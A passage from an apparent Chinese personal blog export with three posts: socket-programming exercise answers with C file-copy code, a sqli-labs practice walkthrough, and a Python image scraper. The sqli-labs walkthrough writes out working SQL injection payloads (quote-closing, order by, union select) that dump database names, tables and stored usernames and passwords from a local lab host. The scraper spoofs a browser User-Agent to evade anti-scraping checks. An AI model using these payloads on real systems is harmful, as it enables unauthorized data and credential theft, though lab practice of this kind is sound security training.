<li>在服务器端创建套接字后，会依次调用listen函数和accept函数。请比较并说明二者的作用。<blockquote>
<p>int listen(int sockfd, int backlog)：调用listen函数转为可接收请求状态。<br>int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen)：调用accept函数受理连接的请求。<br>一个用于监听，一个用于处理。</p>
</blockquote>
</li>
<li>Linux中，对套接字数据进行I/O时可以直接使用文件I/O相关函数；而在Windows中则不可以。原因为何？<blockquote>
<p>在Linux中，socket也被认为是文件一种，所以在网络数据的传输过程中自然可以使用文件I/O的相关函数；而Windows中，是要区分socket和文件的，所以在Windows中需要调用特殊的数据传输相关函数。</p>
</blockquote>
</li>
<li>创建套接字后一般会给它分配地址，为什么？为了完成地址分配需要调用哪个函数？<blockquote>
<p>因为如果没有IP地址和端口号，则其他客户端都无法连接到服务器端。<br>服务器端使用bind函数绑定地址和端口号</p>
</blockquote>
</li>
<li>Linux中的文件描述符与Windows的句柄实际上非常相似。请以套接字为对象说明它们的含义。<blockquote>
<p>文件描述符（句柄）是系统分配给文件或套接字的整数。文件和套接字一般经过创建过程才会被分配文件描述符。这个整数会成为操作系统与程序员之间良好的沟通的渠道。实际上，文件描述符只不过是为了方便称呼操作系统创建的文件或套接字而赋予的数而已。</p>
</blockquote>
</li>
<li>底层文件的I/O函数与ANSI标准定义的文件I/O函数之间有何区别？<blockquote>
<p>底层文件的I/O函数：与标准无关的、操作系统独立提供的I/O操作<br>ANSI标准定义的标准I/O：与操作系统无关，具有一定的可移植性<br><a href="https://blog.csdn.net/owen7500/article/details/53263981" target="_blank" rel="noopener">https://blog.csdn.net/owen7500/article/details/53263981</a><br><a href="https://blog.csdn.net/zqixiao_09/article/details/50444465" target="_blank" rel="noopener">https://blog.csdn.net/zqixiao_09/article/details/50444465</a></p>
</blockquote>
</li>
<li>参考本书给出的示例low_open.c和low_read.c，分别利用底层文件I/O和ANSI标准I/O编写文件复制。可任意指定复制程序的使用方法。</li>
</ol>
<table>
<thead>
<tr>
<th></th>
<th>标准I/O函数</th>
<th>底层I/O函数</th>
</tr>
</thead>
<tbody><tr>
<td>打开</td>
<td>fopen,freopen,fdopen</td>
<td>open</td>
</tr>
<tr>
<td>关闭</td>
<td>fclose</td>
<td>close</td>
</tr>
<tr>
<td>读</td>
<td>getc,fgetc,getchar,fgets,gets,fread</td>
<td>read</td>
</tr>
<tr>
<td>写</td>
<td>putc,fputc,putchar,fputs,puts,fwrite</td>
<td>write</td>
</tr>
</tbody></table>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 底层I/O，文本文件复制实现</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BUF_SIZE 100</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">error_handling</span><span class="params">(<span class="keyword">char</span> *message)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> fd_source, fd_des;</span><br><span class="line">    <span class="keyword">char</span> buf[BUF_SIZE];</span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    </span><br><span class="line">    fd_source=<span class="built_in">open</span>(<span class="string">"data.txt"</span>, O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span>( fd_source==<span class="number">-1</span> )</span><br><span class="line">        error_handling(<span class="string">"open() error!"</span>);</span><br><span class="line">    fd_des=<span class="built_in">open</span>(<span class="string">"data_cpy.txt"</span>, O_CREAT|O_WRONLY|O_TRUNC);</span><br><span class="line">    <span class="keyword">if</span>( fd_des==<span class="number">-1</span> )</span><br><span class="line">        error_handling(<span class="string">"open() error!"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>((n = <span class="built_in">read</span>(fd_source, buf, <span class="keyword">sizeof</span>(buf))) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">write</span>(fd_des, buf, n);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(n == <span class="number">-1</span>)</span><br><span class="line">        error_handling(<span class="string">"read() error"</span>);</span><br><span class="line">    <span class="built_in">close</span>(fd_des);</span><br><span class="line">    <span class="built_in">close</span>(fd_source);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">error_handling</span><span class="params">(<span class="keyword">char</span> *message)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   <span class="built_in">fputs</span>(message, <span class="built_in">stderr</span>);</span><br><span class="line">   fputc(<span class="string">'\n'</span>, <span class="built_in">stderr</span>);</span><br><span class="line">   <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 标准I/O</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BUF_SIZE 100</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">error_handling</span><span class="params">(<span class="keyword">char</span> *message)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    FILE *fp_source = fopen(<span class="string">"/home/visdream/c/data.txt"</span>, <span class="string">"r"</span>);</span><br><span class="line">    FILE *fp_des = fopen(<span class="string">"/home/visdream/c/a.txt"</span>, <span class="string">"w+"</span>);</span><br><span class="line">    <span class="keyword">char</span> buf[BUF_SIZE];</span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    <span class="keyword">char</span> ch;</span><br><span class="line">    <span class="keyword">if</span>(fp_source == <span class="literal">NULL</span>) </span><br><span class="line">        error_handling(<span class="string">"fp_source fopen() error!"</span>);</span><br><span class="line">    <span class="keyword">if</span>(fp_des == <span class="literal">NULL</span>)</span><br><span class="line">        error_handling(<span class="string">"fp_des fopen() error!"</span>);</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    while(!feof(fp_source)) &#123;</span></span><br><span class="line"><span class="comment">        n = fread(buf, 1, sizeof(buf), fp_source);</span></span><br><span class="line"><span class="comment">        fwrite(buf, 1, n, fp_des);</span></span><br><span class="line"><span class="comment">    &#125;*/</span></span><br><span class="line">    <span class="keyword">while</span>((ch = fgetc(fp_source)) != EOF) &#123;</span><br><span class="line">        fputc(ch, fp_des);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    fclose(fp_source);</span><br><span class="line">    fclose(fp_des);</span><br><span class="line">    fp_source = <span class="literal">NULL</span>;</span><br><span class="line">    fp_des = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">error_handling</span><span class="params">(<span class="keyword">char</span> *message)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">fputs</span>(message, <span class="built_in">stderr</span>);</span><br><span class="line">    fputc(<span class="string">'\n'</span>, <span class="built_in">stderr</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="第二章习题"><a href="#第二章习题" class="headerlink" title="第二章习题"></a>第二章习题</h2><ol>
<li>什么是协议？在收发数据中定义协议有何意义？</li>
<li>面向连接得TCP套接字传输特性有3点，请分别说明。</li>
<li>下列哪些是面向消息得套接字的特性？<ul>
<li>a.传输数据可能丢失</li>
<li>b.没有数据边界（Boundary）</li>
<li>c.以快熟传递为目标</li>
<li>d.不限制每次传递数据的大小</li>
<li>e.与面向连接的套接字不同，不存在连接的概念</li>
</ul>
</li>
<li>下列数据适合用哪类套接字传输？并给我原因。<ul>
<li>a.演唱会现场直播的多媒体数据（）</li>
<li>b.某人压缩过的文本文件（）</li>
<li>c.网上银行用户与银行之间的数据传递（）</li>
</ul>
</li>
<li>何种类型的套接字不存在数据边界？这类套接字接收数据时需要注意什么？</li>
<li>tcp_server.c和tcp_client.c中多次调用read函数读取服务器端调用1次write函数传递的字符串。更改程序，使服务器端多次调用（次数自拟）write函数传递数据，客户端调用1次read函数进行读取。为达到这一目的，客户端需延迟调用read函数，因为客户端要等待服务器端传递所有数据。Windows和Linux都通过下列代码延迟read或recv函数的调用。<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">for(i&#x3D;0; i&lt;3000; i++)</span><br><span class="line">    printf(&quot;Wait time %d \n&quot;, i);</span><br></pre></td></tr></table></figure>
让CPU执行多余任务以延迟代码运行的方式称为“Busy Waiting”。使用得当即可推迟函数调用。</li>
</ol>
]]></content>
      <categories>
        <category>TCP/IP网络编程</category>
      </categories>
      <tags>
        <tag>c</tag>
        <tag>网络编程</tag>
      </tags>
  </entry>
  <entry>
    <title>sqli-labs通关记录</title>
    <url>/2020/04/22/sqli-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/</url>
    <content><![CDATA[<h1 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h1><h2 id="资料来源"><a href="#资料来源" class="headerlink" title="资料来源"></a>资料来源</h2><p><a href="https://www.jianshu.com/p/8a5b2f94d69d" target="_blank" rel="noopener">https://www.jianshu.com/p/8a5b2f94d69d</a><br><a href="https://www.cnblogs.com/ssslinppp/p/6178636.html" target="_blank" rel="noopener">https://www.cnblogs.com/ssslinppp/p/6178636.html</a></p>
<h2 id="MYSQL中的information-schema-元数据库-中常用的表"><a href="#MYSQL中的information-schema-元数据库-中常用的表" class="headerlink" title="MYSQL中的information_schema(元数据库)中常用的表"></a>MYSQL中的information_schema(元数据库)中常用的表</h2><h3 id="schemata"><a href="#schemata" class="headerlink" title="schemata"></a>schemata</h3><table>
<thead>
<tr>
<th>字段</th>
<th>解释</th>
</tr>
</thead>
<tbody><tr>
<td>schema</td>
<td>数据库名</td>
</tr>
</tbody></table>
<h3 id="tables"><a href="#tables" class="headerlink" title="tables"></a>tables</h3><table>
<thead>
<tr>
<th>字段</th>
<th>解释</th>
</tr>
</thead>
<tbody><tr>
<td>table_schema</td>
<td>数据库名</td>
</tr>
<tr>
<td>table_name</td>
<td>数据表名</td>
</tr>
</tbody></table>
<h3 id="columns"><a href="#columns" class="headerlink" title="columns"></a>columns</h3><table>
<thead>
<tr>
<th>字段</th>
<th>解释</th>
</tr>
</thead>
<tbody><tr>
<td>table_schema</td>
<td>数据库名</td>
</tr>
<tr>
<td>table_name</td>
<td>数据表名</td>
</tr>
<tr>
<td>columns_name</td>
<td>字段名</td>
</tr>
</tbody></table>
<h2 id="mysql中的常用函数"><a href="#mysql中的常用函数" class="headerlink" title="mysql中的常用函数"></a>mysql中的常用函数</h2><h3 id="与数据库信息相关"><a href="#与数据库信息相关" class="headerlink" title="与数据库信息相关"></a>与数据库信息相关</h3><table>
<thead>
<tr>
<th>函数</th>
<th>解释</th>
</tr>
</thead>
<tbody><tr>
<td>version()</td>
<td>MySQL版本</td>
</tr>
<tr>
<td>user()</td>
<td>数据库用户名</td>
</tr>
<tr>
<td>database()</td>
<td>数据库名</td>
</tr>
<tr>
<td>@@datadir</td>
<td>数据库路径</td>
</tr>
<tr>
<td>@@version_compile_os</td>
<td>操作系统版本</td>
</tr>
</tbody></table>
<h3 id="字符串并接函数"><a href="#字符串并接函数" class="headerlink" title="字符串并接函数"></a>字符串并接函数</h3><table>
<thead>
<tr>
<th>函数</th>
<th>解释</th>
</tr>
</thead>
<tbody><tr>
<td>concat(str1,str2,…)</td>
<td>没有分隔符地连接字符串</td>
</tr>
<tr>
<td>concat_ws(separator,str1,str2,…)</td>
<td>没有分隔符地连接字符串</td>
</tr>
<tr>
<td>group_concat(str1,str2,…)</td>
<td>连接一个组的所有字符串，并以逗号分隔每一条数据</td>
</tr>
</tbody></table>
<h3 id="order-by子句用来判断字段数"><a href="#order-by子句用来判断字段数" class="headerlink" title="order by子句用来判断字段数"></a>order by子句用来判断字段数</h3><p>例如SQL语句：select * from 表名 where id=1 order by n<br>n–&gt;1…n<br>如果这个表中有3个字段的话，n最多为3，如果超过3，mysql就会报错（如果没有关闭报错功能的话），这样的话我们就可以判断有几个字段啦</p>
<h3 id="union-select"><a href="#union-select" class="headerlink" title="union select"></a>union select</h3><p><strong><em>资料来源</em></strong><br><a href="https://blog.csdn.net/weixin_44840696/article/details/89166154" target="_blank" rel="noopener">https://blog.csdn.net/weixin_44840696/article/details/89166154</a><br>这个博客写得特别清晰<br>我们通过已知字段数时，需要找我一个回显数据的地方，union select就可以用来做这个，一会可以通过sqli-labs的练习来了解清楚。<br><em>特别</em>：我们需要让union select前面的sql语句出错，才能在能够在回显的位置显示</p>
<h1 id="sql注入分类"><a href="#sql注入分类" class="headerlink" title="sql注入分类"></a>sql注入分类</h1><p>数字型：当输入的参数为整形时，如果存在注入漏洞，可以认为是数字型注入。<br>字符型：当输入的参数为字符串时，称为字符型。</p>
<h2 id="mysql错误注入"><a href="#mysql错误注入" class="headerlink" title="mysql错误注入"></a>mysql错误注入</h2><h1 id="SQLi-LABS-Page-1-Basic-Challenges"><a href="#SQLi-LABS-Page-1-Basic-Challenges" class="headerlink" title="SQLi-LABS Page-1(Basic Challenges)"></a>SQLi-LABS Page-1(Basic Challenges)</h1><h2 id="Less-1（GET）"><a href="#Less-1（GET）" class="headerlink" title="Less-1（GET）"></a>Less-1（GET）</h2><p>1.根据提示，输入：<a href="http://192.168.20.145:86/Less-1/?id=1" target="_blank" rel="noopener">http://192.168.20.145:86/Less-1/?id=1</a><br>2.尝试是否有注入点，使用单引号尝试。<a href="http://192.168.20.145:86/Less-1/?id=1&#39;" target="_blank" rel="noopener">http://192.168.20.145:86/Less-1/?id=1&#39;</a> ，爆出错误’’1’’ LIMIT 0,1’ 最外层的单引号为错误提示的，真的错误：’1’’ LIMIT 0,1<br>3.构造sql语句。我们输入的内容为1’，剩余部分为原来sql语句所具有的，所以我们可以大致推测出sql语句：select * from 数据表名 where id=’’ LIMIT 0,1<br>4.需要闭合单引号。所以我们可以这样构造输入 1’ --+。接着尝试一下：<a href="http://192.168.20.145:86/Less-1/?id=1&#39;" target="_blank" rel="noopener">http://192.168.20.145:86/Less-1/?id=1&#39;</a> --+ ，发现没有问题，那么我们可以接下去了解更多的信息。<br>5.使用order by来判断字段数。<a href="http://192.168.20.145:86/Less-1/?id=1&#39;" target="_blank" rel="noopener">http://192.168.20.145:86/Less-1/?id=1&#39;</a> order by 3--+ ，当把3换成大于3的数值时，会报错，所以我们判断出有3个字段<br>6.使用union select 来寻找回显位置，构造  <a href="http://192.168.20.145:86/Less-1/?id=0&#39;" target="_blank" rel="noopener">http://192.168.20.145:86/Less-1/?id=0&#39;</a> union select 1,2,3--+ 。其中1、2、3这几个数字可以是任意的。之后发现2，3在name和password那显示出来，我们找到回显位置<br>7.获取数据库名 <a href="http://192.168.20.145:86/Less-1/?id=0&#39;" target="_blank" rel="noopener">http://192.168.20.145:86/Less-1/?id=0&#39;</a> union select 1,database(),3--+<br>8.获取所有数据库名 <a href="http://192.168.20.145:86/Less-1/?id=0&#39;" target="_blank" rel="noopener">http://192.168.20.145:86/Less-1/?id=0&#39;</a> union select 1,group_concat(schema_name),3 from information_schema.schemata --+<br>9.获取当前数据下的所有表名 <a href="http://192.168.20.145:86/Less-1/?id=0&#39;" target="_blank" rel="noopener">http://192.168.20.145:86/Less-1/?id=0&#39;</a> union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()--+<br>10.获取当前数据库，当前数据表中的所有字段名 <a href="http://192.168.20.145:86/Less-1/?id=0&#39;" target="_blank" rel="noopener">http://192.168.20.145:86/Less-1/?id=0&#39;</a> union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#39;users&#39; and table_schema=database()--+<br>11.获取字段值 <a href="http://192.168.20.145:86/Less-1/?id=0&#39;" target="_blank" rel="noopener">http://192.168.20.145:86/Less-1/?id=0&#39;</a> union select 1,group_concat(username,password),3 from users--+</p>
<h2 id="Less-2-GET"><a href="#Less-2-GET" class="headerlink" title="Less-2(GET)"></a>Less-2(GET)</h2><p>less-2与less-1相似，前几个步骤相同<br><a href="http://192.168.20.145:86/Less-2/?id=0" target="_blank" rel="noopener">http://192.168.20.145:86/Less-2/?id=0</a> union select 1,(select group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39; ),(select group_concat(username,password) from%20users) --+</p>
<h2 id="Less-3-GET"><a href="#Less-3-GET" class="headerlink" title="Less-3(GET)"></a>Less-3(GET)</h2><p>同样在数字后加各种符号去测试，可以构造出sql语句：select * from users where id=(‘id’) limit 0,1<br>所以我们使用：<a href="http://192.168.20.145:86/Less-3/?id=1&#39;" target="_blank" rel="noopener">http://192.168.20.145:86/Less-3/?id=1&#39;</a>) --+  来测试<br>其他上述操作皆可</p>
<h2 id="Less-4-GET"><a href="#Less-4-GET" class="headerlink" title="Less-4(GET)"></a>Less-4(GET)</h2><p>同样在数字后面各种符号去测试，例如&quot; 和 \。<br>select * from users where id=(&quot;id&quot;) limit 0,1<br><a href="http://192.168.20.145:86/Less-4/?id=0&quot;" target="_blank" rel="noopener">http://192.168.20.145:86/Less-4/?id=0&quot;</a>)  union select 1,2,3 --+</p>
<h2 id="Less-5-GET"><a href="#Less-5-GET" class="headerlink" title="Less-5(GET)"></a>Less-5(GET)</h2>]]></content>
      <tags>
        <tag>sql注入</tag>
        <tag>sqli-labs</tag>
      </tags>
  </entry>
  <entry>
    <title>图片爬虫py</title>
    <url>/2020/05/24/%E5%9B%BE%E7%89%87%E7%88%AC%E8%99%ABpy/</url>
    <content><![CDATA[<h1 id="原则-爬虫要适度，不然会有搞垮别人的网站-不要爬取利益相关-违法收集他人信息"><a href="#原则-爬虫要适度，不然会有搞垮别人的网站-不要爬取利益相关-违法收集他人信息" class="headerlink" title="原则:爬虫要适度，不然会有搞垮别人的网站.不要爬取利益相关,违法收集他人信息."></a>原则:爬虫要适度，不然会有搞垮别人的网站.不要爬取利益相关,违法收集他人信息.</h1><blockquote>
<p>爬虫要适度，不然会有搞垮别人的网站。不要爬取利益相关,违法收集他人信息.</p>
</blockquote>
<h1 id="遭遇到的问题"><a href="#遭遇到的问题" class="headerlink" title="遭遇到的问题"></a>遭遇到的问题</h1><blockquote>
<ol>
<li>反爬虫<br>构造header即可，因为requests库中默认头部会告知网站自己为爬虫</li>
<li>ajax动态网站的爬取(点击后加载并并接到当前网页)<br>同样的方式构造爬虫但是比上述方式复杂<br>F12打开开发者工具-&gt;network-&gt;XHR-&gt;点击相关网页-&gt;右击-&gt;Copy-&gt;Copy as cURL(bash)-&gt; 复制到网站 <a href="https://curl.trillworks.com/" target="_blank" rel="noopener">https://curl.trillworks.com/</a> 下的curl command 选择语言 后自动生成<br>具体的操作流程查看 <a href="https://www.cnblogs.com/becks/p/12243014.html" target="_blank" rel="noopener">https://www.cnblogs.com/becks/p/12243014.html</a></li>
<li>登录才能查看<br>该问题,我还未遇到,需要爬取的为需要登录的网站.后续如果需要在更新.</li>
</ol>
</blockquote>
<h1 id="xpath与re的一些疑惑"><a href="#xpath与re的一些疑惑" class="headerlink" title="xpath与re的一些疑惑"></a>xpath与re的一些疑惑</h1><blockquote>
<ol>
<li>x.path(….)[0] 表示将返回的内容变成字符串(如果返回的是数组则无效)<br>若是返回的为数组,我的解决方式是<br>str = nameList[0][0:] (利用切片的方式)</li>
<li>re.findAll(…)[0] 道理与上方相同</li>
</ol>
</blockquote>
<h1 id="实战代码"><a href="#实战代码" class="headerlink" title="实战代码"></a>实战代码</h1><h2 id="静态网页"><a href="#静态网页" class="headerlink" title="静态网页"></a>静态网页</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">p</span><span class="params">(urlList)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> url <span class="keyword">in</span> urlList:</span><br><span class="line">        print(url)</span><br><span class="line">    print(<span class="string">'----------------------'</span>)</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">xpathReturnUrlList</span><span class="params">(url, xstring)</span>:</span></span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">'User-Agent'</span>: <span class="string">'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36'</span></span><br><span class="line">    &#125;</span><br><span class="line">    s = requests.session() <span class="comment"># 解决链接过多不断开问题</span></span><br><span class="line">    s.keep_alive = <span class="literal">False</span> <span class="comment"># 解决链接过多不断开问题</span></span><br><span class="line">    response = requests.get(url, headers=headers)</span><br><span class="line">    dtree = etree.HTML(response.text)</span><br><span class="line">    urlList = dtree.xpath(xstring)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> urlList</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">download</span><span class="params">(filename, url)</span>:</span></span><br><span class="line">    response = requests.get(url)</span><br><span class="line">    <span class="keyword">with</span> open(filename, <span class="string">'wb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(response.content)</span><br><span class="line">        f.close</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">toNumer</span><span class="params">(str)</span>:</span></span><br><span class="line">    result = str[<span class="number">0</span>] + str[<span class="number">1</span>]</span><br><span class="line">    re = int(result)</span><br><span class="line">    <span class="keyword">return</span> re</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(<span class="string">'风之领域'</span>):</span><br><span class="line">    os.mkdir(<span class="string">'风之领域'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">3</span>):</span><br><span class="line">    url = <span class="string">'https://www.lanvshen.com/x/86/'</span></span><br><span class="line">    <span class="keyword">if</span> i &gt; <span class="number">0</span> :</span><br><span class="line">        url = <span class="string">'https://www.lanvshen.com/x/86/index_%s.html'</span>%i</span><br><span class="line">    urlList = xpathReturnUrlList(url, <span class="string">'//div[@class="hezi"]/ul/li/a/img//@src'</span>)</span><br><span class="line">    titleList = xpathReturnUrlList(url, <span class="string">'//p[@class="biaoti"]/a/text()'</span>)</span><br><span class="line">    numberList = xpathReturnUrlList(url, <span class="string">'//span[@class="shuliang"]/text()'</span>)</span><br><span class="line">    length = len(urlList)</span><br><span class="line">    print(len(urlList), len(titleList), len(numberList))</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>, length): <span class="comment">#选择第一页第一图的链接</span></span><br><span class="line">        url = urlList[j]</span><br><span class="line">        number = toNumer(numberList[j])</span><br><span class="line">        name = re.findall(<span class="string">r'NO.\d\d\d'</span>, titleList[j][<span class="number">0</span>:])[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> range(<span class="number">0</span>, number):</span><br><span class="line">            filename = <span class="string">'风之领域/'</span> + name + <span class="string">'_'</span>+ str(k+<span class="number">1</span>) + <span class="string">'.jpg'</span></span><br><span class="line">            durl = url.replace(<span class="string">'0.jpg'</span>, <span class="string">'%s.jpg'</span>%(k+<span class="number">1</span>))</span><br><span class="line">            print(<span class="string">'durl'</span>, k+<span class="number">1</span>, <span class="string">'ok'</span>)</span><br><span class="line">            download(filename, durl)</span><br><span class="line">        time.sleep(<span class="number">2</span>)</span><br><span class="line">    time.sleep(<span class="number">2</span>)</span><br></pre></td></tr></table></figure>
<h2 id="动态网页"><a href="#动态网页" class="headerlink" title="动态网页"></a>动态网页</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(<span class="string">'vmgirls摄影写真'</span>):</span><br><span class="line">    os.mkdir(<span class="string">'vmgirls摄影写真'</span>)</span><br><span class="line"><span class="comment">#构造头部和数据</span></span><br><span class="line">headers = &#123;</span><br><span class="line">    ... <span class="comment"># 自己按照上方操作生成headers</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment"># 自己按照上方操作生成data</span></span><br><span class="line">data = &#123;</span><br><span class="line">  <span class="string">'append'</span>: <span class="string">'list-archive'</span>,</span><br><span class="line">  <span class="string">'paged'</span>: <span class="string">'2'</span>,</span><br><span class="line">  <span class="string">'action'</span>: <span class="string">'ajax_load_posts'</span>,</span><br><span class="line">  <span class="string">'query'</span>: <span class="string">'17'</span>,</span><br><span class="line">  <span class="string">'page'</span>: <span class="string">'cat'</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment"># 或许还有生成cookie</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">6</span>):</span><br><span class="line">    data[<span class="string">'paged'</span>] = i</span><br><span class="line">    response = requests.post(<span class="string">'https://www.vmgirls.com/wp-admin/admin-ajax.php'</span>, headers=headers, data=data)</span><br><span class="line">    dtree = etree.HTML(response.text) <span class="comment">#将页面转换成文档树</span></span><br><span class="line">    urlList = dtree.xpath(<span class="string">'//a[@class="media-content"]//@href'</span>)</span><br><span class="line">    urlNameList = dtree.xpath(<span class="string">'//a[@class="media-content"]//@title'</span>)</span><br><span class="line">    print(<span class="string">'第'</span>, i, <span class="string">'页'</span>)</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>, len(urlNameList)):</span><br><span class="line">        print(j+<span class="number">1</span>, urlNameList[j], urlList[j])</span><br><span class="line">        response = requests.get(urlList[j], headers=headers)</span><br><span class="line">        dtree = etree.HTML(response.text)</span><br><span class="line">        imgUrlList = dtree.xpath(<span class="string">'//div[@class="nc-light-gallery"]/p/a//@href'</span>)</span><br><span class="line">        <span class="comment"># print('前 len', len(imgUrlList))</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> len(imgUrlList) == <span class="number">0</span>:</span><br><span class="line">            imgUrlList = dtree.xpath(<span class="string">'//div[@class="nc-light-gallery"]/p/img/@data-src'</span>)</span><br><span class="line">        <span class="comment"># print('后 len', len(imgUrlList))</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> range(<span class="number">0</span>, len(imgUrlList)):</span><br><span class="line">            <span class="comment"># print('\t', k+1, imgUrlList[k])</span></span><br><span class="line">            filename = <span class="string">'vmgirls摄影写真/'</span> + urlNameList[j] + <span class="string">'_'</span> + str(k+<span class="number">1</span>) + <span class="string">'.jpg'</span></span><br><span class="line">            s = requests.session()</span><br><span class="line">            s.keep_alive = <span class="literal">False</span></span><br><span class="line">            response = requests.get(imgUrlList[k], headers=headers)</span><br><span class="line">            <span class="keyword">with</span> open(filename, <span class="string">'wb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">                f.write(response.content)</span><br><span class="line">                f.close()</span><br><span class="line">            print(<span class="string">'\t\t'</span>, k+<span class="number">1</span>, <span class="string">'success'</span>)</span><br><span class="line">            time.sleep(<span class="number">1</span>)</span><br><span class="line">        time.sleep(<span class="number">2</span>)</span><br><span class="line">    time.sleep(<span class="number">2</span>)</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>爬虫</category>
        <category>python</category>
      </categories>
      <tags>
        <tag>爬虫</tag>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>常见算法整理</title>
    <url>/2020/06/05/%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95%E6%95%B4%E7%90%86/</url>
